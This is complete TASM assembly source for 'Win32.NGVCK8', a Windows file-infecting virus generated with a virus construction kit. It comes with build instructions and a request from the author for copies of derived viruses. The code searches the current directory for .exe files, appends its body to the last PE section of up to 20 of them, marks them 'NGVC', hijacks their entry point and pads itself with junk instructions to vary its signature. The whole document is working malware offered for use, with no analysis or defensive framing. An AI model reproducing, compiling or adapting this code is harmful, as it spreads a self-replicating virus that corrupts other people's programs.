              
;
;
; Win32.NGVCK8 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK8
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 41
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 31015 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov edx, dword ptr [esp]
                                        ; add esp, 4
 inc esp
 add esp, 3d
                                        ; mov ebp, edx
 mov ebp, edx
 sub ebp, offset Delta
 jmp KernelSearchStart


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -61315d
 add edx, 61315d
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; mov ebx, -1
 mov ebx, ( -1d - 32d )
 add ebx, 32d
 and ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx

 not edx                                ; Trash
 mov edx, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], edx

 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea ecx, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
 mov edx, 96117655d                     ; Trash
                                        ; retrieve PE - Header
 mov esi, ebx
 add esi, [ebx+3Ch]
                                        ; get File Alignment
 mov edx, [esi+3Ch]
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+AlignReg1], eax
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 mov esi, -11891d
 add esi, 11891d
 add esi, eax
                                        ; get last section
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [esi+06h]
 dec ebx
 imul ebx, ebx, 28h
 add eax, ebx
                                        ; add eax, 120
 inc eax
 add eax, 119d
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [esi+74h]
 clc
 rcl ecx, 3
 add eax, ecx
                                        ; get old Entrypoint
 mov ecx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], ecx
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ecx
                                        ; clear ebx
 xor ebx, ebx

 add ebx, [eax+10h]
                                        ; mov edx, ebx
                                        ; clear edx
 sub edx, edx
 add edx, ebx
 add eax, 14h
 add ebx, [eax]
 sub eax, 14h
 push ebx
 mov ecx, edx
 add eax, 0Ch
 add ecx, [eax]
 sub eax, 0Ch
 mov dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ecx
 mov ecx, [eax+10h]
 push ecx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], ecx
 pop ecx
 add ecx,  (VirusSize-1447d)
 add ecx, 1447d
 mov dword ptr [eax+08h], 0
 add dword ptr [eax+08h], ecx
 mov ecx, dword ptr [eax+0Ch]
 add ecx, dword ptr [eax+10h]
 mov dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea eax, [ebp+Virus]
 xchg esi, eax

 add edi, dword ptr [ebp+MapAddress]
 mov ebx, VirusSize

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 dec edx
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov edx, NumberOfApis
 mov ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear eax
 mov eax, 17353d
 sub eax, 17353d
 add eax, [ecx+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 inc eax
 add eax, 27d
                                        ; get ATableVA
 mov ecx, dword ptr [eax]
                                        ; add eax, 4
 inc eax
 xor ebx, 68419120d                     ; Trash
 add eax, 3d
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; get NTableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
                                        ; add eax, 4
 add eax, 4d
 mov dword ptr [ebp+NTableVA], ecx
                                        ; get OTableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
 add ebx, 30106039d                     ; Trash
 mov dword ptr [ebp+OTableVA], ecx
                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]
 xchg edi, eax

 lea esi, [ebp+APINames]
 xchg esi, ecx


GetApisLoop: 

 mov ebx, ecx
APINameDetect:                          ; calculate the lenght of the names
 inc ebx
 cmp byte ptr [ebx], 0
 jne APINameDetect

 sub ebx, ecx
                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; ecx points to the Name
                                        ; edi points to the offset
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 call SearchAPI1
 push ecx
 add dword ptr [esp], ebx
 pop ecx
                                        ; add ecx, 1
 sub ecx, -1d
 mov eax, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], eax
                                        ; add edi, 4
 dec edi
 add edi, 5d
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; ecx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], edx
 dec dword ptr [ebp+Trash1]             ; Trash
 mov eax, dword ptr [edx]
 add eax, [ebp+KernelMZ]
                                        ; mov edx, eax
 push eax
 pop edx
                                        ; mov esi, eax
 mov esi, eax
 mov dword ptr [ebp+TempApisearch1], -1
 and dword ptr [ebp+TempApisearch1], ebx
 push esi
 mov dword ptr [ebp+TempApisearch3], ecx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ah, byte ptr [ecx]
 cmp ah, byte ptr [esi]
 jne ApiNotFound
 dec ebx
 cmp ebx, 0
 je FoundApi1
                                        ; add esi, 1
 add esi, 1d
                                        ; add ecx, 1
 add ecx, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 mov ecx, dword ptr [ebp+TempApisearch3]
 mov edx, dword ptr [ebp+NTableTemp]
 push dword ptr [ebp+TempApisearch1]
 pop ebx
                                        ; add edx, 4
 inc edx
 add edx, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop esi
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop eax
 mov dword ptr [ebp+Trash1], edx        ; Trash
 movzx edx, word ptr [eax]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
 shr ebx, 11d                           ; Trash
                                        ; check for minimum filesize
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear esi
 and esi, 0
 xor esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx eax, word ptr [esi]
 xor eax, 'ZM'
 jz Goodfile
                                        ; mov ecx, 22230
 mov ecx, 22230d
 test ecx, ecx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [esi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [esi+3Ch]
 pop eax
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],eax
 jb Notagoodfile
 add eax, esi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
                                        ; clear ebx
 xor ebx, ebx
 test ebx, ebx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov cx, word ptr [eax+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov dx, word ptr [eax+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile
 sar edx, 23d                           ; Trash

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx

                                        ; clear edx
 xor edx, edx
 xor edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ecx,12345678h
 org $-4
 retEIP dd 0h
 add ecx,12345678h
 org $-4
 retBase dd 0h
 jmp ecx



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 and ebx, 0

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 inc ebx
 push ebx
 push 80000000h or 40000000h
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, eax

 push eax
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax
 adc edx, 58368291d                     ; Trash

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 push ebx
 push 0
 push 00000004h
 xor ecx, 37094422d                     ; Trash
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 or eax, eax
 jz CloseFile
                                        ; clear ecx
 and ecx, 0
 push ebx
 push ecx
 push ecx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edx

 push ebx
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edi, offset WIN32_FIND_DATA
 add edi, ebp

 push edi
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 mov ecx, ( 276d xor 36d )
 xor ecx, 36d
 lea eax, [ebp+WFD_szFileName]
 xchg eax, edi

                                        ; clear eax
 mov eax, 61931d
 sub eax, 61931d
 rep stosb
 popad
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov eax, dword ptr [esp]
                                        ; round to pages
 ror eax, 16d
 shl eax, 16d
                                        ; add eax, 1
 sub eax, -1d
GetKernelLoop:
                                        ; clear edx
 push 0
 pop edx
 sub eax, 1
 mov dx, word ptr [eax+03ch]
 cmp dx,0f800h
 je GetKernelLoop
 cmp eax, dword ptr [eax+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], eax
                                        ; add eax, 60
 inc eax
 add eax, 59d
 mov ebx, [eax]
 inc eax
 sub eax, 61d
 add ebx, eax
 mov [KernelPE+ebp], ebx

 jmp GetApis

;                  [ ///// * Data * \\\\\ ]

Data:
 TempApisearch3 dd 0h
 ATableVA    dd 0h
 OTableVA    dd 0h
 KernelPE    dd 0h
 counter     dw 0h

 APINames:
 db 'FindFirstFileA', 0
 db 'MapViewOfFile', 0
 db 'CreateFileA', 0
 db 'CreateFileMappingA', 0
 db 'UnmapViewOfFile', 0
 db 'CloseHandle', 0
 db 'FindClose', 0
 db 'FindNextFileA', 0

 TempAPI     dd 0h
 FindHandle  dd 0h
 Trash1      dd 0h
 filemask    db '*.Exe',0
 AlignReg1   dd 0h
 InfCounter  dd 0h
 OldEIP      dd 0h
 NTableTemp  dd 0h
 MapAddress  dd 0h
 AlignReg2   dd 0h
 FileHandle  dd 0h
 NewSize     dd 0h
 KernelMZ    dd 0h
 db 'Win32.NGVCK8 created by SnakeByte',0

 APIOffsets:
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h
 XUnmapViewOfFile       dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XFindNextFileA         dd 0h

 TempApisearch1 dd 0h
 Trash2      dd 0h
 OldBase     dd 400000h
 NewEIP      dd 0h
 MapHandle   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NTableVA    dd 0h




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

